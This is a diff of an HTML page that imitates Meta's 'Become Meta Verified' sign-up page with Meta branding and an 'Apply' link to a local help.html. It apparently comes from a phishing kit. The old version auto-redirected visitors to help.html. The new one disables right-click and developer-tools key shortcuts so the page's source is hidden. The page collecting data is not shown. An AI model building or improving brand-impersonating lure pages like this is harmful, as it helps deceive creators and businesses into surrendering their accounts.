@@ -1,136 +1,118 @@
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Home</title>
-<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css" rel="stylesheet">
-<style>
-  /* CSS styles */
-  body {
-    font-family: system-ui;
-    margin: 0;
-    padding: 0;
-  }
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Home</title>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css" rel="stylesheet">
+    <link rel="icon" href="https://pbs.twimg.com/media/GQB99gQaQAEUOZ7?format=png&name=small">
+    <style>
+        body {
+            font-family: system-ui;
+            margin: 0;
+            padding: 0;
+        }
 
-  .container-fluid {
-    background: #F5F6F6;
-  }
-  .container {
-    padding: 1rem;
-  }
+        .container-fluid {
+            background: #F5F6F6;
+        }
 
-  .logo {
-    width: 10rem;
-    height: 3rem;
-  }
+        .btn {
+            background: #0064e0;
+            border: none;
+            border-radius: 100px;
+            padding: 10px 35px;
+            text-decoration: none;
+            color: white;
+            display: inline-block;
+            margin-top: 1rem;
+            font-family: Arial, sans-serif;
+            font-size: 16px;
+        }
 
-  .meta-logo {
-    width: 5rem;
-    height: 5rem;
-  }
+        .content {
+            margin-top: 3rem;
+            display: flex;
+            justify-content: center;
+        }
 
-  .btn {
-    background: #0064e0;
-    border: none;
-    border-radius: 100px;
-    padding: 10px 35px;
-    text-decoration: none;
-    color: white;
-    display: inline-block;
-    margin-top: 1rem;
-    font-family: Arial, sans-serif; /* Same font family */
-    font-size: 16px; /* Adjust as needed */
-  }
+        .content .col-sm-6 {
+            margin-top: 3rem;
+            margin-left: 5rem;
+        }
 
-  .content {
-    margin-top: 3rem;
-    display: flex;
-    justify-content: center;
-  }
+        .content p {
+            font-size: 18px;
+            margin-top: 1rem;
+            font-family: Arial, sans-serif;
+        }
 
-  .content .col-sm-6 {
-    margin-top: 3rem;
-    margin-left: 5rem;
-  }
+        .sign-up {
+            font-size: 17px;
+            padding-top: 1rem;
+            font-family: Arial, sans-serif;
+        }
 
-  .content p {
-    font-size: 18px;
-    margin-top: 1rem;
-    font-family: Arial, sans-serif; /* Same font family */
-  }
+        .business-info {
+            font-size: 14px;
+            font-family: Arial, sans-serif;
+        }
 
-  .sign-up {
-    font-size: 17px;
-    padding-top: 1rem;
-    font-family: Arial, sans-serif; /* Same font family */
-  }
+        .region-info {
+            font-size: small;
+            opacity: 95%;
+            font-family: Arial, sans-serif;
+        }
 
-  .business-info {
-    font-size: 14px;
-    font-family: Arial, sans-serif; /* Same font family */
-  }
+        .image {
+            display: none;
+            width: 42%;
+            height: 100vh;
+            background-size: cover;
+        }
 
-  .region-info {
-    font-size: 13px;
-    font-style: italic;
-    font-family: Arial, sans-serif; /* Same font family */
-  }
-
-  .image {
-    display: none;
-    width: 42%;
-    height: 42vh; /* Ensure full height */
-    background-size: cover;
-    /* background-position: center; */
-    /* margin-left: 5rem; */
-
-  }
-
-  @media (min-width: 576px) {
-    .image {
-      display: block;
-    }
-  }
-
-
-</style>
+        @media (min-width: 576px) {
+            .image {
+                display: block;
+            }
+        }
+    </style>
 </head>
-<body>
-  <div class="container-fluid">
-    <div class="container">
-      <img src="https://cdn.glitch.global/b4a2a482-023b-4cda-88ab-ea4d4916e0d7/Meta_Platforms_Inc._logo.svg?v=1719784126031" alt="logo" class="logo">
-    </div>
-  </div>
-  <div class="content">
-    <div class="col-sm-6">
-      <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e4/Twitter_Verified_Badge.svg/800px-Twitter_Verified_Badge.svg.png" alt="meta" class="meta-logo">
-      <h1 class="my-3 fs-1">Become <br> Meta Verified</h1>
-      <div style="margin-bottom: 30px;"></div>
-      <a href="help.html" class="btn">Apply</a>
-      <p class="mt-4">Grow your social presence with Meta Verified – a new subscription <br> bundle available for creators and businesses on Instagram and <br> Facebook.</p>
-      <p class="sign-up">Sign up now for creators</p>
-      <p class="mt-4 mb-0">
-        <span class="fw-semibold">Are you a business?</span> Get more
-        information on
-      </p>
-      <a href="#" class="business-info">Meta verified for businesses</a>
-      <p class="mt-4 font-italic region-info">Features, availability, and pricing may vary by region.</p>
-    </div>
-    <div class="col-sm-5 image" style="background-image: url('./background.png'); "></div>
-  </div>
-</body>
-<script>
-  document.addEventListener('contextmenu', event => {
-    event.preventDefault();
-  });
 
-  setTimeout(function() {
-        var redirectURL = "help.html"; // Updated URL
-        window.location.replace(redirectURL);
-      }, 3000); // 3000 milliseconds (4 seconds)
-});
-</script>
+<body>
+    <div class="container-fluid">
+        <img width="120px" src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/ab/Meta-Logo.png/2560px-Meta-Logo.png" alt="Meta Logo">
+    </div>
+    <div class="content">
+        <div class="col-sm-6">
+            <img width="80px" src="https://pbs.twimg.com/media/GPdx6Mca8AAfVbt?format=png&name=360x360" alt="Meta Verified Icon">
+            <h1 class="my-3 fs-1">Become <br> Meta Verified</h1>
+            <div style="margin-bottom: 30px;"></div>
+
+            <a href="help.html" class="btn">Apply</a>
+
+            <p class="mt-4">Grow your social presence with Meta Verified – a new subscription <br> bundle available for creators and businesses on Instagram and <br> Facebook.</p>
+            <p class="sign-up">Sign up now for creators</p>
+            <p class="mt-4 mb-0">
+                <span class="fw-semibold">Are you a business?</span> Get more information on
+            </p>
+            <a href="#" class="business-info">Meta verified for businesses</a> <br><br>
+            <i class="region-info">Features, availability, and pricing may vary by region.</i>
+        </div>
+        <div class="col-sm-5 image" style="background-image: url('https://pbs.twimg.com/media/GPUPRg0a8AACTSj?format=jpg&name=small');"></div>
+    </div>
+
+    <script>
+        document.addEventListener('contextmenu', function(e) {
+            e.preventDefault();
+        });
+        document.onkeydown = function(e) {
+            if (e.ctrlKey && (e.shiftKey || e.key === "I" || e.key === "i")) {
+                e.preventDefault();
+            }
+        };
+    </script>
+</body>
+
 </html>
 
